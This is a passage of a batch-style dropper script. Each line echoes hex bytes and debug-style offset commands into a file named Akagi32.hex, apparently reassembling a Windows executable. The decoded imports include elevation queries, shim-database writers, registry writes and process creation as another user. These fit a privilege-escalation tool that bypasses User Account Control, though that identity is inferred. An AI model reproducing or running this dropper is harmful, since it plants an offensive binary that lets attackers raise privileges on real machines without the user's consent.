echo a4 c1 00 00 c4 c1 00 00 5e c0 00 00 48 c0 00 00 38 c0 00 00 dc c3 00 00 24 c0 00 00 06 c0 00 00 f2 bf 00 00 d6 bf 00 00 be bf 00 00 b2 bf 00 00 98 bf 00 00 7a bf 00 00 62 bf 00 00 52 bf 00 00 44 bf 00 00 34 bf 00 00 2a bf 00 00 0a bf 00 00 f2 be 00 00 d2 be 00 00 bc be 00 00 a2 be 00 00 8c be 00 00 7c be 00 00 68 be 00 00 58 be 00 00 3e be 00 00 1a be 00 00 fe bd 00 00 f0 bd 00 00>>Akagi32.hex
echo e a100>>Akagi32.hex
echo ce bd 00 00 b4 bd 00 00 22 c1 00 00 8c c1 00 00 00 00 00 00 44 bd 00 00 58 bd 00 00 68 bd 00 00 7a bd 00 00 8a bd 00 00 9c bd 00 00 34 bd 00 00 00 00 00 00 c9 01 47 65 74 43 6f 6d 6d 61 6e 64 4c 69 6e 65 57 00 09 02 47 65 74 43 75 72 72 65 6e 74 50 72 6f 63 65 73 73 00 50 02 47 65 74 4c 61 73 74 45 72 72 6f 72 00 00 a8 03 4c 6f 61 64 4c 69 62 72 61 72 79 57 00 00 51 01 45 78 69 74>>Akagi32.hex
echo e a180>>Akagi32.hex
echo 50 72 6f 63 65 73 73 00 67 02 47 65 74 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 57 00 00 f2 02 47 65 74 54 69 63 6b 43 6f 75 6e 74 00 00 50 04 52 65 61 64 46 69 6c 65 00 00 e1 05 57 72 69 74 65 46 69 6c 65 00 fc 04 53 65 74 46 69 6c 65 50 6f 69 6e 74 65 72 00 00 37 02 47 65 74 46 69 6c 65 49 6e 66 6f 72 6d 61 74 69 6f 6e 42 79 48 61 6e 64 6c 65 00 00 e2 02 47 65 74 54 65 6d 70 50 61 74>>Akagi32.hex
echo e a200>>Akagi32.hex
echo 68 41 00 00 ba 00 43 72 65 61 74 65 46 69 6c 65 41 00 07 01 44 65 6c 65 74 65 46 69 6c 65 41 00 7f 00 43 6c 6f 73 65 48 61 6e 64 6c 65 00 5c 01 46 69 6c 65 54 69 6d 65 54 6f 4c 6f 63 61 6c 46 69 6c 65 54 69 6d 65 00 cd 05 57 69 64 65 43 68 61 72 54 6f 4d 75 6c 74 69 42 79 74 65 00 e0 02 47 65 74 54 65 6d 70 46 69 6c 65 4e 61 6d 65 41 00 00 5b 01 46 69 6c 65 54 69 6d 65 54 6f 44 6f>>Akagi32.hex
echo e a280>>Akagi32.hex
echo 73 44 61 74 65 54 69 6d 65 00 0b 05 53 65 74 4c 61 73 74 45 72 72 6f 72 00 00 9d 02 47 65 74 50 72 6f 63 41 64 64 72 65 73 73 00 00 35 02 47 65 74 46 69 6c 65 41 74 74 72 69 62 75 74 65 73 57 00 00 0a 01 44 65 6c 65 74 65 46 69 6c 65 57 00 b2 00 43 72 65 61 74 65 44 69 72 65 63 74 6f 72 79 57 00 00 ab 05 57 61 69 74 46 6f 72 53 69 6e 67 6c 65 4f 62 6a 65 63 74 00 e8 00 43 72 65 61>>Akagi32.hex
echo e a300>>Akagi32.hex
echo 74 65 54 68 72 65 61 64 00 00 73 01 46 69 6e 64 46 69 72 73 74 46 69 6c 65 57 00 00 3c 02 47 65 74 46 69 6c 65 53 69 7a 65 45 78 00 7f 01 46 69 6e 64 4e 65 78 74 46 69 6c 65 57 00 68 01 46 69 6e 64 43 6c 6f 73 65 00 c2 00 43 72 65 61 74 65 46 69 6c 65 57 00 85 05 55 6e 6d 61 70 56 69 65 77 4f 66 46 69 6c 65 00 52 05 53 6c 65 65 70 00 a5 00 43 6f 70 79 46 69 6c 65 57 00 bf 00 43 72>>Akagi32.hex
echo e a380>>Akagi32.hex
echo 65 61 74 65 46 69 6c 65 4d 61 70 70 69 6e 67 57 00 00 c0 03 4d 61 70 56 69 65 77 4f 66 46 69 6c 65 00 fa 03 4f 75 74 70 75 74 44 65 62 75 67 53 74 72 69 6e 67 57 00 00 be 02 47 65 74 53 74 61 72 74 75 70 49 6e 66 6f 57 00 63 02 47 65 74 4d 6f 64 75 6c 65 46 69 6c 65 4e 61 6d 65 57 00 00 10 03 47 65 74 57 69 6e 64 6f 77 73 44 69 72 65 63 74 6f 72 79 57 00 00 9e 01 46 72 65 65 4c 69>>Akagi32.hex
echo e a400>>Akagi32.hex
echo 62 72 61 72 79 00 a7 03 4c 6f 61 64 4c 69 62 72 61 72 79 45 78 57 00 00 4b 45 52 4e 45 4c 33 32 2e 64 6c 6c 00 00 25 02 4c 6f 61 64 49 6d 61 67 65 57 00 00 71 02 50 6f 73 74 51 75 69 74 4d 65 73 73 61 67 65 00 3f 03 54 72 61 6e 73 6c 61 74 65 4d 65 73 73 61 67 65 00 00 b5 00 44 69 73 70 61 74 63 68 4d 65 73 73 61 67 65 57 00 00 89 02 52 65 67 69 73 74 65 72 43 6c 61 73 73 45 78 57>>Akagi32.hex
echo e a480>>Akagi32.hex
echo 00 00 49 03 55 6e 72 65 67 69 73 74 65 72 43 6c 61 73 73 57 00 00 bc 02 53 65 6e 64 4d 65 73 73 61 67 65 57 00 00 71 00 43 72 65 61 74 65 57 69 6e 64 6f 77 45 78 57 00 34 01 47 65 74 44 43 00 a1 00 44 65 66 57 69 6e 64 6f 77 50 72 6f 63 57 00 00 73 01 47 65 74 4d 65 73 73 61 67 65 57 00 37 01 47 65 74 44 65 73 6b 74 6f 70 57 69 6e 64 6f 77 00 00 4d 02 4d 65 73 73 61 67 65 42 6f 78>>Akagi32.hex
echo e a500>>Akagi32.hex
echo 57 00 55 53 45 52 33 32 2e 64 6c 6c 00 00 fa 02 53 65 74 50 69 78 65 6c 46 6f 72 6d 61 74 00 00 15 03 53 77 61 70 42 75 66 66 65 72 73 00 19 00 43 68 6f 6f 73 65 50 69 78 65 6c 46 6f 72 6d 61 74 00 47 44 49 33 32 2e 64 6c 6c 00 88 02 52 65 67 4f 70 65 6e 4b 65 79 57 00 6c 02 52 65 67 44 65 6c 65 74 65 56 61 6c 75 65 57 00 a2 02 52 65 67 53 65 74 56 61 6c 75 65 45 78 57 00 00 54 02>>Akagi32.hex
echo e a580>>Akagi32.hex
echo 52 65 67 43 6c 6f 73 65 4b 65 79 00 92 02 52 65 67 51 75 65 72 79 56 61 6c 75 65 45 78 57 00 00 5d 02 52 65 67 43 72 65 61 74 65 4b 65 79 45 78 57 00 68 02 52 65 67 44 65 6c 65 74 65 4b 65 79 57 00 60 02 52 65 67 43 72 65 61 74 65 4b 65 79 57 00 8b 00 43 72 65 61 74 65 50 72 6f 63 65 73 73 41 73 55 73 65 72 57 00 00 41 44 56 41 50 49 33 32 2e 64 6c 6c 00 00 36 01 53 68 65 6c 6c 45>>Akagi32.hex
echo e a600>>Akagi32.hex
echo 78 65 63 75 74 65 45 78 57 00 9a 00 53 48 43 72 65 61 74 65 49 74 65 6d 46 72 6f 6d 50 61 72 73 69 6e 67 4e 61 6d 65 00 53 48 45 4c 4c 33 32 2e 64 6c 6c 00 4f 00 43 6f 49 6e 69 74 69 61 6c 69 7a 65 00 00 1a 00 43 6f 43 72 65 61 74 65 49 6e 73 74 61 6e 63 65 00 00 19 00 43 6f 43 72 65 61 74 65 47 75 69 64 00 00 ba 01 53 74 72 69 6e 67 46 72 6f 6d 47 55 49 44 32 00 f4 00 49 49 44 46>>Akagi32.hex
echo e a680>>Akagi32.hex
echo 72 6f 6d 53 74 72 69 6e 67 00 0c 00 43 4c 53 49 44 46 72 6f 6d 53 74 72 69 6e 67 00 43 00 43 6f 47 65 74 4f 62 6a 65 63 74 00 6f 6c 65 33 32 2e 64 6c 6c 00 c4 03 52 74 6c 47 65 74 4e 74 56 65 72 73 69 6f 6e 4e 75 6d 62 65 72 73 00 00 98 02 52 74 6c 41 64 64 56 65 63 74 6f 72 65 64 45 78 63 65 70 74 69 6f 6e 48 61 6e 64 6c 65 72 00 00 ad 04 52 74 6c 52 61 6e 64 6f 6d 45 78 00 b4 03>>Akagi32.hex
echo e a700>>Akagi32.hex
echo 52 74 6c 47 65 74 46 72 61 6d 65 00 7e 04 52 74 6c 50 6f 70 46 72 61 6d 65 00 c7 04 52 74 6c 52 65 6d 6f 76 65 56 65 63 74 6f 72 65 64 45 78 63 65 70 74 69 6f 6e 48 61 6e 64 6c 65 72 00 8a 04 52 74 6c 51 75 65 72 79 45 6c 65 76 61 74 69 6f 6e 46 6c 61 67 73 00 00 fc 02 52 74 6c 43 72 65 61 74 65 48 65 61 70 00 aa 04 52 74 6c 52 61 69 73 65 45 78 63 65 70 74 69 6f 6e 00 84 04 52 74>>Akagi32.hex
echo e a780>>Akagi32.hex
echo 6c 50 75 73 68 46 72 61 6d 65 00 00 49 01 4e 74 46 72 65 65 56 69 72 74 75 61 6c 4d 65 6d 6f 72 79 00 c8 00 4e 74 41 6c 6c 6f 63 61 74 65 56 69 72 74 75 61 6c 4d 65 6d 6f 72 79 00 1b 03 52 74 6c 44 65 63 6f 6d 70 72 65 73 73 42 75 66 66 65 72 00 76 05 52 74 6c 57 6f 77 36 34 45 6e 61 62 6c 65 46 73 52 65 64 69 72 65 63 74 69 6f 6e 45 78 00 9a 03 52 74 6c 46 72 65 65 55 6e 69 63 6f>>Akagi32.hex
echo e a800>>Akagi32.hex
echo 64 65 53 74 72 69 6e 67 00 00 42 03 52 74 6c 44 6f 73 50 61 74 68 4e 61 6d 65 54 6f 4e 74 50 61 74 68 4e 61 6d 65 5f 55 00 00 eb 00 4e 74 43 6c 6f 73 65 00 fa 00 4e 74 43 72 65 61 74 65 45 76 65 6e 74 00 0e 02 4e 74 53 65 74 45 76 65 6e 74 00 00 fc 00 4e 74 43 72 65 61 74 65 46 69 6c 65 00 00 5b 02 4e 74 57 61 69 74 46 6f 72 53 69 6e 67 6c 65 4f 62 6a 65 63 74 00 73 01 4e 74 4e 6f>>Akagi32.hex
echo e a880>>Akagi32.hex
echo 74 69 66 79 43 68 61 6e 67 65 44 69 72 65 63 74 6f 72 79 46 69 6c 65 00 f7 00 4e 74 43 72 65 61 74 65 44 69 72 65 63 74 6f 72 79 4f 62 6a 65 63 74 00 7e 01 4e 74 4f 70 65 6e 4b 65 79 00 ef 03 52 74 6c 49 6e 69 74 55 6e 69 63 6f 64 65 53 74 72 69 6e 67 00 00 6a 00 4c 64 72 45 6e 75 6d 65 72 61 74 65 4c 6f 61 64 65 64 4d 6f 64 75 6c 65 73 00 19 03 52 74 6c 44 65 63 6f 64 65 50 6f 69>>Akagi32.hex
echo e a900>>Akagi32.hex
echo 6e 74 65 72 00 00 8f 03 52 74 6c 46 6f 72 6d 61 74 43 75 72 72 65 6e 74 55 73 65 72 4b 65 79 50 61 74 68 00 4f 03 52 74 6c 45 6e 63 6f 64 65 50 6f 69 6e 74 65 72 00 00 34 02 4e 74 53 65 74 56 61 6c 75 65 4b 65 79 00 87 01 4e 74 4f 70 65 6e 50 72 6f 63 65 73 73 54 6f 6b 65 6e 00 00 79 00 4c 64 72 47 65 74 50 72 6f 63 65 64 75 72 65 41 64 64 72 65 73 73 00 00 9f 02 52 74 6c 41 6c 6c>>Akagi32.hex
echo e a980>>Akagi32.hex
echo 6f 63 61 74 65 48 65 61 70 00 72 00 4c 64 72 47 65 74 44 6c 6c 48 61 6e 64 6c 65 00 b2 01 4e 74 51 75 65 72 79 49 6e 66 6f 72 6d 61 74 69 6f 6e 50 72 6f 63 65 73 73 00 6e 00 4c 64 72 46 69 6e 64 52 65 73 6f 75 72 63 65 5f 55 00 db 01 4e 74 52 65 61 64 46 69 6c 65 00 00 b5 01 4e 74 51 75 65 72 79 49 6e 66 6f 72 6d 61 74 69 6f 6e 54 6f 6b 65 6e 00 e0 03 52 74 6c 49 6d 61 67 65 4e 74>>Akagi32.hex
echo e aa00>>Akagi32.hex
echo 48 65 61 64 65 72 00 00 55 03 52 74 6c 45 6e 74 65 72 43 72 69 74 69 63 61 6c 53 65 63 74 69 6f 6e 00 af 01 4e 74 51 75 65 72 79 49 6e 66 6f 72 6d 61 74 69 6f 6e 46 69 6c 65 00 00 95 03 52 74 6c 46 72 65 65 48 65 61 70 00 ee 03 52 74 6c 49 6e 69 74 53 74 72 69 6e 67 00 45 04 52 74 6c 4c 65 61 76 65 43 72 69 74 69 63 61 6c 53 65 63 74 69 6f 6e 00 6e 04 52 74 6c 4e 74 53 74 61 74 75>>Akagi32.hex
echo e aa80>>Akagi32.hex
echo 73 54 6f 44 6f 73 45 72 72 6f 72 00 f2 04 52 74 6c 53 65 74 4c 61 73 74 57 69 6e 33 32 45 72 72 6f 72 00 00 6d 03 52 74 6c 45 78 70 61 6e 64 45 6e 76 69 72 6f 6e 6d 65 6e 74 53 74 72 69 6e 67 73 5f 55 00 63 00 4c 64 72 41 63 63 65 73 73 52 65 73 6f 75 72 63 65 00 6e 74 64 6c 6c 2e 64 6c 6c 00 09 00 53 64 62 57 72 69 74 65 44 57 4f 52 44 54 61 67 00 00 03 00 53 64 62 43 72 65 61 74>>Akagi32.hex
echo e ab00>>Akagi32.hex
echo 65 44 61 74 61 62 61 73 65 00 08 00 53 64 62 57 72 69 74 65 42 69 6e 61 72 79 54 61 67 00 01 00 53 64 62 43 6c 6f 73 65 44 61 74 61 62 61 73 65 57 72 69 74 65 00 04 00 53 64 62 44 65 63 6c 61 72 65 49 6e 64 65 78 00 00 00 53 64 62 42 65 67 69 6e 57 72 69 74 65 4c 69 73 74 54 61 67 00 00 07 00 53 64 62 53 74 6f 70 49 6e 64 65 78 69 6e 67 00 02 00 53 64 62 43 6f 6d 6d 69 74 49 6e 64>>Akagi32.hex
echo e ab80>>Akagi32.hex
echo 65 78 65 73 00 00 0a 00 53 64 62 57 72 69 74 65 53 74 72 69 6e 67 54 61 67 00 05 00 53 64 62 45 6e 64 57 72 69 74 65 4c 69 73 74 54 61 67 00 00 06 00 53 64 62 53 74 61 72 74 49 6e 64 65 78 69 6e 67 00 00 41 70 70 48 65 6c 70 2e 64 6c 6c 00 2d 00 67 6c 43 6f 6c 6f 72 34 69 00 10 00 67 6c 43 6c 65 61 72 00 51 00 67 6c 45 6e 64 00 b5 00 67 6c 4d 61 74 72 69 78 4d 6f 64 65 00 00 4b 00>>Akagi32.hex
echo e ac00>>Akagi32.hex
echo 67 6c 44 72 61 77 50 69 78 65 6c 73 00 00 f4 00 67 6c 52 65 61 64 50 69 78 65 6c 73 00 00 59 01 77 67 6c 43 72 65 61 74 65 43 6f 6e 74 65 78 74 00 00 a4 00 67 6c 4c 6f 61 64 49 64 65 6e 74 69 74 79 00 00 0a 00 67 6c 42 65 67 69 6e 00 41 01 67 6c 56 65 72 74 65 78 32 69 00 00 64 01 77 67 6c 4d 61 6b 65 43 75 72 72 65 6e 74 00 00 49 00 67 6c 44 72 61 77 42 75 66 66 65 72 00 00 4f 50>>Akagi32.hex
echo e ac80>>Akagi32.hex
echo 45 4e 47 4c 33 32 2e 64 6c 6c 00 00 43 4f 4d 43 54 4c 33 32 2e 64 6c 6c 00 00 43 61 62 69 6e 65 74 2e 64 6c 6c 00 01 00 41 70 70 6c 79 44 65 6c 74 61 42 00 07 00 44 65 6c 74 61 46 72 65 65 00 0a 00 47 65 74 44 65 6c 74 61 49 6e 66 6f 42 00 6d 73 64 65 6c 74 61 2e 64 6c 6c 00 4d 05 52 74 6c 55 6e 77 69 6e 64 00 a3 05 56 69 72 74 75 61 6c 51 75 65 72 79 00 00 6d 03 49 73 50 72 6f 63>>Akagi32.hex
echo e ad00>>Akagi32.hex
echo 65 73 73 6f 72 46 65 61 74 75 72 65 50 72 65 73 65 6e 74 00 82 05 55 6e 68 61 6e 64 6c 65 64 45 78 63 65 70 74 69 6f 6e 46 69 6c 74 65 72 00 00 43 05 53 65 74 55 6e 68 61 6e 64 6c 65 64 45 78 63 65 70 74 69 6f 6e 46 69 6c 74 65 72 00 61 05 54 65 72 6d 69 6e 61 74 65 50 72 6f 63 65 73 73 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e ad80>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e ae00>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e ae80>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e af00>>Akagi32.hex
echo 00 00 00 00 20 93 40 00 7d 59 40 00 00 00 00 00 b0 1d 00 00 ff ff ff ff c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 83 59 40 00 00 00 00 00 b0 1d 00 00 80 25 00 00 c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 83 59 40 00 00 00 00 00 80 25 00 00 00 28 00 00 c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 83 59 40 00 00 00 00 00 b0 1d 00 00 34 29 00 00 c8 00 00 00 00 00 00 00>>Akagi32.hex
echo e af80>>Akagi32.hex
echo 01 00 00 00 01 00 00 00 99 59 40 00 00 00 00 00 b0 1d 00 00 00 28 00 00 ff ff ff ff 00 00 00 00 00 00 00 00 00 00 00 00 ea 59 40 00 00 00 00 00 b0 1d 00 00 98 27 00 00 ff ff ff ff 00 00 00 00 01 00 00 00 00 00 00 00 10 5a 40 00 00 00 00 00 b0 1d 00 00 a3 27 00 00 c8 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 10 5a 40 00 00 00 00 00 b0 1d 00 00 a3 27 00 00 c8 00 00 00 00 00 00 00>>Akagi32.hex
echo e b000>>Akagi32.hex
echo 01 00 00 00 01 00 00 00 83 59 40 00 00 00 00 00 b0 1d 00 00 80 25 00 00 c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 59 5a 40 00 00 00 00 00 b0 1d 00 00 98 27 00 00 c9 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 6b 5a 40 00 00 00 00 00 b0 1d 00 00 34 29 00 00 c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 99 59 40 00 00 00 00 00 b0 1d 00 00 00 28 00 00 c8 00 00 00 01 00 00 00>>Akagi32.hex
echo e b080>>Akagi32.hex
echo 00 00 00 00 01 00 00 00 83 59 40 00 00 00 00 00 00 28 00 00 5a 29 00 00 c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 a5 5a 40 00 00 00 00 00 b0 1d 00 00 ec 37 00 00 c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 c9 5a 40 00 00 00 00 00 b0 1d 00 00 34 29 00 00 c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 db 5a 40 00 00 00 00 00 b0 1d 00 00 ec 37 00 00 c8 00 00 00 00 00 00 00>>Akagi32.hex
echo e b100>>Akagi32.hex
echo 01 00 00 00 01 00 00 00 2b 5b 40 00 00 00 00 00 b0 1d 00 00 ec 37 00 00 c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 3d 5b 40 00 00 00 00 00 80 25 00 00 1f 38 00 00 c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 4f 5b 40 00 00 00 00 00 b0 1d 00 00 1f 38 00 00 c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 61 5b 40 00 00 00 00 00 b0 1d 00 00 1f 38 00 00 c8 00 00 00 00 00 00 00>>Akagi32.hex
echo e b180>>Akagi32.hex
echo 01 00 00 00 01 00 00 00 b2 5a 40 00 00 00 00 00 b0 1d 00 00 ff ff ff ff c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 87 5b 40 00 00 00 00 00 b0 1d 00 00 ff ff ff ff c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 87 5b 40 00 00 00 00 00 b0 1d 00 00 ff ff ff ff ca 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 ef 5b 40 00 00 00 00 00 b0 1d 00 00 ff ff ff ff c8 00 00 00 00 00 00 00>>Akagi32.hex
echo e b200>>Akagi32.hex
echo 01 00 00 00 01 00 00 00 01 5c 40 00 00 00 00 00 b0 1d 00 00 b7 3a 00 00 ff ff ff ff 00 00 00 00 00 00 00 00 00 00 00 00 1d 5c 40 00 00 00 00 00 b0 1d 00 00 b7 3a 00 00 c8 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 70 5c 40 00 00 00 00 00 b0 1d 00 00 b7 3a 00 00 c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 96 5c 40 00 00 00 00 00 b0 1d 00 00 ff ff ff ff ff ff ff ff 00 00 00 00>>Akagi32.hex
echo e b280>>Akagi32.hex
echo 01 00 00 00 00 00 00 00 f0 5c 40 00 00 00 00 00 b0 1d 00 00 80 25 00 00 c8 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 16 5d 40 00 00 00 00 00 00 28 00 00 ff ff ff ff ff ff ff ff 00 00 00 00 01 00 00 00 00 00 00 00 30 5d 40 00 00 00 00 00 b0 1d 00 00 ff ff ff ff ff ff ff ff 00 00 00 00 01 00 00 00 01 00 00 00 40 5d 40 00 00 00 00 00 00 28 00 00 ff ff ff ff ff ff ff ff 00 00 00 00>>Akagi32.hex
echo e b300>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 05 93 19 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 b1 19 bf 44 4e e6 40 bb 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e b380>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e b400>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e b480>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e b500>>Akagi32.hex
echo 0d 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e b580>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e b600>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e b680>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e b700>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 05 00 03 00 00 00 38 00 00 80 0a 00 00 00 58 00 00 80 0e 00 00 00 80 00 00 80 10 00 00 00 98 00 00 80 18 00 00 00 b0 00 00 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 01 00 00 00 c8 00 00 80 02 00 00 00 e0 00 00 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 03 00 c8 00 00 00 f8 00 00 80 c9 00 00 00 10 01 00 80 ca 00 00 00 28 01 00 80>>Akagi32.hex
echo e b780>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 68 00 00 00 40 01 00 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 01 00 00 00 58 01 00 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 01 00 00 00 70 01 00 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 09 04 00 00 88 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 09 04 00 00 98 01 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e b800>>Akagi32.hex
echo 00 00 00 00 00 00 01 00 09 04 00 00 a8 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 09 04 00 00 b8 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 09 04 00 00 c8 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 09 04 00 00 d8 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 09 04 00 00 e8 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00>>Akagi32.hex
echo e b880>>Akagi32.hex
echo 09 04 00 00 f8 01 00 00 10 02 01 00 a8 1c 00 00 00 00 00 00 00 00 00 00 b8 1e 01 00 a8 0c 00 00 00 00 00 00 00 00 00 00 58 2e 01 00 ac 2c 00 00 00 00 00 00 00 00 00 00 08 5b 01 00 e2 0d 00 00 00 00 00 00 00 00 00 00 f0 68 01 00 cd 10 00 00 00 00 00 00 00 00 00 00 60 2b 01 00 22 00 00 00 00 00 00 00 00 00 00 00 88 2b 01 00 cc 02 00 00 00 00 00 00 00 00 00 00 c0 79 01 00 8c 03 00 00>>Akagi32.hex
echo e b900>>Akagi32.hex
